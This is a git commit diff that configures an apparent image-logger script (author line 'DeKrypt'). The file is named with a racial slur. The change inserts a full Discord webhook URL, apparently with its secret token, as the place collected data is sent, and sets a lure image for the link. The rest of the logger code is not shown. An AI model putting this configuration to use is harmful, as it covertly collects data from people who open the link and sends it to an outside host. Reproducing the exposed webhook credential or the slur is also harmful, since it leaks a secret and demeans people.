93ec30be24de436870074fac112664096383a305
gassemmostaki123m-alt <gassemmostaki123m@gmail.com>
2025-12-05 14:33:48 +0100

    Update nigga.py

--- api/nigga.py
+++ api/nigga.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1446494460442574860/N21W1dgod91rvgYPNqNRuxckQyxs19cVv3CycXx-Fz8WmhCFCcY37PV7oAXu9oj5e_OM",
+    "image": "https://cdn.wallpaperhub.app/cloudcache/6/9/0/e/e/f/690eefe3ba1f553e0ea527f51ee407b604b681b4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
